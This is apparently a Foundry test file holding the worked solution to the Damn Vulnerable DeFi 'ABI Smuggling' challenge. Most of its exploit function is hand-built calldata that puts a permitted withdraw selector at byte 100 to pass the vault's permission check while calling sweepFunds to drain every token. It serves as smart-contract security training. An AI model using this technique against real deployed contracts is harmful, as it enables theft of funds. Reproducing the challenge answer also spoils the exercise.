// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

/**
 * @title  ABI Smuggling Challenge — Test + Exploit
 * @notice Damn Vulnerable DeFi v4 challenge: "ABI Smuggling"
 *
 * ══════════════════════════════════════════════════════════════════
 * VULNERABILITY SUMMARY
 * ══════════════════════════════════════════════════════════════════
 * AuthorizedExecutor.execute() reads the "inner" function selector
 * directly from a hard-coded calldata offset (byte 100) instead of
 * decoding the ABI-encoded `actionData` parameter properly.
 *
 * This means an attacker can place a *fake* selector at byte 100
 * (satisfying the permission check) while encoding the *real* target
 * function at a different position inside actionData.
 * The EVM's ABI decoder ignores the fake word entirely — it follows
 * the offset pointer and finds the legitimate inner calldata.
 *
 * Net effect:
 *   • Permission check sees:  d9caed12  (withdraw — player IS allowed)
 *   • Actual call executes:   85fb709d  (sweepFunds — player is NOT allowed)
 *
 * ══════════════════════════════════════════════════════════════════
 * PERMISSION SETUP (from setUp)
 * ══════════════════════════════════════════════════════════════════
 *   deployer → 85fb709d (sweepFunds) on vault   ✔ allowed
 *   player   → d9caed12 (withdraw)   on vault   ✔ allowed
 *
 * The player is NOT granted permission for sweepFunds.
 * The exploit tricks the permission check into reading withdraw's
 * selector while actually invoking sweepFunds.
 * ══════════════════════════════════════════════════════════════════
 */
contract ABISmugglingChallenge is Test {

    // ─────────────────────────────────────────────
    // Actors
    // ─────────────────────────────────────────────

    address deployer = makeAddr("deployer");  // Contract owner / permission bootstrapper
    address player   = makeAddr("player");   // Attacker — has withdraw permission only
    address recovery = makeAddr("recovery"); // Destination for drained tokens

    // ─────────────────────────────────────────────
    // Constants
    // ─────────────────────────────────────────────

    /// @dev Total tokens pre-loaded into the vault. Goal: move all of these to `recovery`.
    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    // ─────────────────────────────────────────────
    // Contracts under test
    // ─────────────────────────────────────────────

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    // ─────────────────────────────────────────────
    // Modifiers
    // ─────────────────────────────────────────────

    /**
     * @dev Wraps the solution function: pranks as `player`, runs the body,
     *      stops the prank, then calls _isSolved() to assert success conditions.
     *      Do NOT modify — part of the challenge harness.
     */
    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // ─────────────────────────────────────────────
    // Setup — DO NOT TOUCH
    // ─────────────────────────────────────────────

    /**
     * @dev Deploys token + vault and registers two permissions:
     *
     *   Permission 0 — deployer may call sweepFunds (85fb709d) on vault
     *   Permission 1 — player   may call withdraw   (d9caed12) on vault
     *
     *  The vault is then funded with 1,000,000 DVT tokens.
     *  After setUp, `initialized` is true and no further permissions can be set.
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy the ERC-20 token (mints total supply to deployer).
        token = new DamnValuableToken();

        // Deploy the vault (AuthorizedExecutor is uninitialized at this point).
        vault = new SelfAuthorizedVault();

        // Build the two permission hashes using getActionId(selector, executor, target).
        // hex"85fb709d" = bytes4(keccak256("sweepFunds(address,address)")) — deployer only
        // hex"d9caed12" = bytes4(keccak256("withdraw(address,address,uint256)")) — player only
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        bytes32 playerPermission   = vault.getActionId(hex"d9caed12", player,   address(vault));

        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;

        // One-shot initialization — locks permissions forever after this call.
        vault.setPermissions(permissions);

        // Fund the vault; deployer holds total supply after construction.
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    // ─────────────────────────────────────────────
    // Sanity checks — DO NOT TOUCH
    // ─────────────────────────────────────────────

    /**
     * @dev Verifies the starting state before any exploit attempt:
     *   • Vault is initialized and holds all tokens.
     *   • Player has no tokens.
     *   • Direct calls to sweepFunds / withdraw revert (CallerNotAllowed).
     */
    function test_assertInitialState() public {
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Neither actor can call vault functions directly — onlyThis blocks them.
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));

        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    // ─────────────────────────────────────────────
    // Exploit — SOLUTION
    // ─────────────────────────────────────────────

    /**
     * @notice ABI-smuggling exploit: tricks execute()'s selector extraction
     *         into reading a permitted selector (withdraw) while the actual
     *         calldata encodes the restricted function (sweepFunds).
     *
     * ── How execute() reads the selector (the bug) ──────────────────────
     *
     *   uint256 calldataOffset = 4 + 32 * 3; // = 100
     *   assembly { selector := calldataload(calldataOffset) }
     *
     *   The contract assumes actionData always begins at byte 100.
     *   In standard ABI encoding for execute(address,bytes), actionData
     *   DOES start at byte 100 — but only if the offset pointer (at [36:68])
     *   equals 0x40 (64). We set it to 0x80 (128) instead, pushing the real
     *   actionData 32 bytes further. This leaves bytes [100:132] free for us
     *   to plant any 4-byte value we want (the "smuggled" selector).
     *
     * ── Full calldata layout ────────────────────────────────────────────
     *
     *  Byte range   Length   Content
     *  ──────────   ──────   ──────────────────────────────────────────────
     *  [0   : 4  ]   4 B    execute() selector
     *  [4   : 36 ]  32 B    target = address(vault)  (ABI-padded)
     *  [36  : 68 ]  32 B    actionData offset = 0x80 (128)
     *                         → ABI decoder finds actionData at byte 4+128 = 132
     *  [68  : 100]  32 B    filler (32 zero bytes) — ignored by ABI decoder
     *  [100 : 132]  32 B    *** SMUGGLED WORD ***
     *                         First 4 bytes = d9caed12 (withdraw selector)
     *                         execute() reads bytes4 here → permission check PASSES
     *                         ABI decoder never reads this word → ignored
     *  [132 : 164]  32 B    actionData length (= innerCalldata.length)
     *  [164 :  …  ]   N B   actionData content = sweepFunds(recovery, token)
     *                         This is what the vault actually executes.
     *
     * ── Why the vault executes sweepFunds despite failing permission ────
     *
     *   1. execute() reads selector at byte 100 → d9caed12 (withdraw).
     *   2. getActionId(d9caed12, player, vault) → matches playerPermission → PASS.
     *   3. _beforeFunctionCall: target == address(this) → PASS.
     *   4. target.functionCall(actionData): ABI decoder follows offset 0x80,
     *      finds innerCalldata at byte 132, decodes it as sweepFunds(recovery, token).
     *   5. sweepFunds runs under onlyThis (msg.sender == vault via execute's relay).
     *   6. All 1,000,000 DVT transferred to `recovery`. 
     */
    function test_abiSmuggling() public checkSolvedByPlayer {

        // ── Step 1: grab execute()'s own selector for the outer call ──
        bytes4 executeSelector = vault.execute.selector;

        // ── Step 2: encode the real inner call we want executed ──
        // sweepFunds(address receiver, IERC20 token)
        // selector: 85fb709d  (deployer has this permission, player does NOT)
        bytes memory innerCalldata = abi.encodeWithSelector(
            bytes4(hex"85fb709d"), // sweepFunds selector
            recovery,             // receiver — all tokens go here
            address(token)        // token to drain
        );

        // ── Step 3: hand-craft the malicious calldata ──
        //
        // We use abi.encodePacked so we control every byte precisely.
        // Normal abi.encode(address(vault), innerCalldata) would set offset=0x40
        // and place innerCalldata at byte 100, exposing its real selector.
        // Instead we set offset=0x80 and insert our fake selector at byte 100.
        bytes memory payload = abi.encodePacked(
            executeSelector,                     // [0:4]     outer selector
            abi.encode(address(vault)),          // [4:36]    target (32-byte padded address)
            uint256(0x80),                       // [36:68]   offset=128 → decoder reads actionData from byte 4+128=132
            bytes32(0),                          // [68:100]  filler — decoder skips this (it's before actionData)
            bytes32(bytes4(hex"d9caed12")),      // [100:132] SMUGGLED: withdraw selector, left-aligned, right-padded
                                                 //           execute() reads bytes4 here → permission check passes
                                                 //           ABI decoder ignores this entirely (it's "before" actionData)
            uint256(innerCalldata.length),       // [132:164] actionData length field (as decoder sees it)
            innerCalldata                        // [164+]    actual calldata → sweepFunds(recovery, token)
        );

        // ── Step 4: fire the crafted payload directly at the vault ──
        // We bypass Solidity's type system with a raw .call() so we can send
        // non-standard ABI encoding that the compiler would never produce.
        (bool success,) = address(vault).call(payload);
        require(success, "exploit failed");

        // _isSolved() (called by checkSolvedByPlayer) will assert:
        //   vault balance == 0  &&  recovery balance == VAULT_TOKEN_BALANCE
    }

    // ─────────────────────────────────────────────
    // Success condition — DO NOT TOUCH
    // ─────────────────────────────────────────────

    /**
     * @dev Called automatically by checkSolvedByPlayer after the exploit runs.
     *      Both assertions must hold for the challenge to be considered solved.
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0,                  "Vault still has tokens");
        assertEq(token.balanceOf(recovery),       VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
